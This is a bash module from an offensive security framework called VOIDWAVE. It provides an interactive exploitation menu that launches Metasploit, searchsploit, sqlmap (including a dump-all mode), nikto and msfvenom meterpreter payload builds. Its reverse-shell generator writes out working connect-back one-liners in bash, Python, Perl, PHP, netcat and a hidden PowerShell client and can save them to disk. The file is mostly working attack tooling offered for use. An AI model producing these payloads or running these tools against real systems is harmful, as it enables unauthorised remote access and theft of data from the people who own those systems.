#!/usr/bin/env bash
# ═══════════════════════════════════════════════════════════════════════════════
# VOIDWAVE - Offensive Security Framework
# ═══════════════════════════════════════════════════════════════════════════════
# Copyright (c) 2025 Nerds489
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at:
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# See LICENSE and NOTICE files in the project root for full details.
# ═══════════════════════════════════════════════════════════════════════════════
#
# Exploitation Menu: Metasploit, SQLMap, payload generation, reverse shells
# ═══════════════════════════════════════════════════════════════════════════════

[[ -n "${_VOIDWAVE_EXPLOIT_MENU_LOADED:-}" ]] && return 0
declare -r _VOIDWAVE_EXPLOIT_MENU_LOADED=1

show_exploit_menu() {
    [[ "${VW_NON_INTERACTIVE:-0}" == "1" ]] && return 1

    while true; do
        clear_screen 2>/dev/null || clear
        show_banner "${VERSION:-}"

        echo -e "    ${C_BOLD:-}Exploitation${C_RESET:-}"
        echo ""
        echo "    1) Metasploit Console"
        echo "    2) SearchSploit Lookup"
        echo "    3) SQLMap"
        echo "    4) Reverse Shell Generator"
        echo "    5) Payload Generator (msfvenom)"
        echo "    6) Nikto Web Scanner"
        echo "    0) Back"
        echo ""

        local choice
        echo -en "    ${C_PURPLE:-}▶${C_RESET:-} Select [0-6]: "
        read -r choice
        choice="${choice//[[:space:]]/}"

        case "$choice" in
            1) _exploit_msf ;;
            2) _exploit_searchsploit ;;
            3) _exploit_sqlmap ;;
            4) _exploit_revshell ;;
            5) _exploit_payload ;;
            6) _exploit_nikto ;;
            0) return 0 ;;
            "") continue ;;
            *) echo -e "    ${C_RED:-}[!] Invalid option: '$choice'${C_RESET:-}"; sleep 1 ;;
        esac
    done
}

_exploit_msf() {
    echo ""

    if ! command -v msfconsole &>/dev/null; then
        echo -e "    ${C_RED:-}Metasploit not found${C_RESET:-}"
        echo "    Install: apt install metasploit-framework"
        wait_for_keypress
        return 1
    fi

    echo -e "    ${C_CYAN:-}Launching Metasploit${C_RESET:-}"
    echo ""

    msfconsole 2>&1 || true

    wait_for_keypress
}

_exploit_searchsploit() {
    echo ""

    if ! command -v searchsploit &>/dev/null; then
        echo -e "    ${C_RED:-}searchsploit not found${C_RESET:-}"
        echo "    Install: apt install exploitdb"
        wait_for_keypress
        return 1
    fi

    local query
    read -rp "    Search term (e.g., apache 2.4, wordpress): " query
    [[ -z "$query" ]] && return

    echo ""
    echo -e "    ${C_CYAN:-}Searching: $query${C_RESET:-}"
    echo ""

    searchsploit "$query" 2>&1 | sed 's/^/    /'

    wait_for_keypress
}

_exploit_sqlmap() {
    echo ""

    if ! command -v sqlmap &>/dev/null; then
        echo -e "    ${C_RED:-}sqlmap not found${C_RESET:-}"
        echo "    Install: apt install sqlmap"
        wait_for_keypress
        return 1
    fi

    local target
    read -rp "    Target URL (with parameter, e.g., http://site.com/page?id=1): " target
    [[ -z "$target" ]] && return

    echo ""
    echo "    1) Basic test"
    echo "    2) Enumerate databases"
    echo "    3) Dump all"
    echo "    4) Custom options"
    echo ""

    local mode
    read -rp "    Select [1-4]: " mode

    local opts=""
    case "$mode" in
        1) opts="--batch" ;;
        2) opts="--batch --dbs" ;;
        3) opts="--batch --dump-all" ;;
        4) read -rp "    Custom options: " opts ;;
        *) return ;;
    esac

    echo ""
    echo -e "    ${C_CYAN:-}Running sqlmap${C_RESET:-}"
    echo ""

    # shellcheck disable=SC2086
    sqlmap -u "$target" $opts 2>&1 | sed 's/^/    /' || true

    wait_for_keypress
}

_exploit_revshell() {
    echo ""

    local lhost lport shell_type

    local default_ip
    default_ip=$(get_local_ip 2>/dev/null)

    read -rp "    LHOST [$default_ip]: " lhost
    lhost="${lhost:-$default_ip}"

    read -rp "    LPORT [4444]: " lport
    lport="${lport:-4444}"

    echo ""
    echo "    1) Bash"
    echo "    2) Python"
    echo "    3) Perl"
    echo "    4) PHP"
    echo "    5) Netcat"
    echo "    6) PowerShell"
    echo ""

    read -rp "    Select [1-6]: " shell_type

    local payload=""
    case "$shell_type" in
        1) payload="bash -i >& /dev/tcp/$lhost/$lport 0>&1" ;;
        2) payload="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" ;;
        3) payload="perl -e 'use Socket;\$i=\"$lhost\";\$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" ;;
        4) payload="php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" ;;
        5) payload="nc -e /bin/sh $lhost $lport" ;;
        6) payload="powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length))-ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+\"PS \"+(pwd).Path+\"> \";\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()}" ;;
        *) return ;;
    esac

    echo ""
    echo -e "    ${C_CYAN:-}Generated Payload:${C_RESET:-}"
    echo ""
    echo "    $payload"
    echo ""

    # Save option
    if confirm "Save to file?"; then
        local outdir="${VOIDWAVE_OUTPUT_DIR:-$HOME/.voidwave/output}/payloads"
        mkdir -p "$outdir"
        local outfile="$outdir/revshell_$(date +%Y%m%d_%H%M%S).txt"
        echo "$payload" > "$outfile"
        echo -e "    ${C_GREEN:-}Saved: $outfile${C_RESET:-}"
    fi

    wait_for_keypress
}

_exploit_payload() {
    echo ""

    if ! command -v msfvenom &>/dev/null; then
        echo -e "    ${C_RED:-}msfvenom not found${C_RESET:-}"
        echo "    Install: apt install metasploit-framework"
        wait_for_keypress
        return 1
    fi

    local lhost lport
    local default_ip
    default_ip=$(get_local_ip 2>/dev/null)

    read -rp "    LHOST [$default_ip]: " lhost
    lhost="${lhost:-$default_ip}"

    read -rp "    LPORT [4444]: " lport
    lport="${lport:-4444}"

    echo ""
    echo "    1) Windows EXE"
    echo "    2) Linux ELF"
    echo "    3) Python"
    echo "    4) PHP"
    echo "    5) ASP"
    echo "    6) WAR (Java)"
    echo ""

    local ptype
    read -rp "    Select [1-6]: " ptype

    local payload format ext
    case "$ptype" in
        1) payload="windows/meterpreter/reverse_tcp"; format="exe"; ext="exe" ;;
        2) payload="linux/x86/meterpreter/reverse_tcp"; format="elf"; ext="elf" ;;
        3) payload="python/meterpreter/reverse_tcp"; format="raw"; ext="py" ;;
        4) payload="php/meterpreter/reverse_tcp"; format="raw"; ext="php" ;;
        5) payload="windows/meterpreter/reverse_tcp"; format="asp"; ext="asp" ;;
        6) payload="java/jsp_shell_reverse_tcp"; format="war"; ext="war" ;;
        *) return ;;
    esac

    local outdir="${VOIDWAVE_OUTPUT_DIR:-$HOME/.voidwave/output}/payloads"
    mkdir -p "$outdir"
    local outfile="$outdir/payload_$(date +%Y%m%d_%H%M%S).$ext"

    echo ""
    echo -e "    ${C_CYAN:-}Generating payload${C_RESET:-}"
    echo -e "    ${C_GRAY:-}msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format${C_RESET:-}"
    echo ""

    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$outfile" 2>&1 | sed 's/^/    /'

    [[ -f "$outfile" ]] && echo -e "    ${C_GREEN:-}Saved: $outfile${C_RESET:-}"

    wait_for_keypress
}

_exploit_nikto() {
    echo ""

    if ! command -v nikto &>/dev/null; then
        echo -e "    ${C_RED:-}nikto not found${C_RESET:-}"
        echo "    Install: apt install nikto"
        wait_for_keypress
        return 1
    fi

    local target
    read -rp "    Target URL (http://...): " target
    [[ -z "$target" ]] && return

    echo ""
    echo -e "    ${C_CYAN:-}Running nikto${C_RESET:-}"
    echo ""

    nikto -h "$target" 2>&1 | sed 's/^/    /' || true

    wait_for_keypress
}

# ═══════════════════════════════════════════════════════════════════════════════
# EXPORTS
# ═══════════════════════════════════════════════════════════════════════════════

export -f show_exploit_menu
export -f _exploit_msf _exploit_searchsploit _exploit_sqlmap
export -f _exploit_revshell _exploit_payload _exploit_nikto
